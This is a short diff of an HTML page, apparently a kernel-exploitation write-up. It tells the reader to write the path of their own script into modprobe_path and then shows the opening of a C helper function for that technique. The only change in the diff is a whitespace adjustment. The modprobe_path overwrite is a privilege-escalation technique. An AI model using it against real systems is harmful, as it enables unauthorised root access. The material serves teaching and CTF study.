@@ -219,7 +219,7 @@
 <p>Write in <code>modeprobe_path</code> the path of your binary/script (this should be <code>&lt;path&gt;/x</code>).</p>
 <p>Then call this function to automate the rest:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">modprobe</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> path){
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> size <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(path) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> size <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(path) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>;
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> flag_dest[size];
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> flag[size];
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> trigger[size];
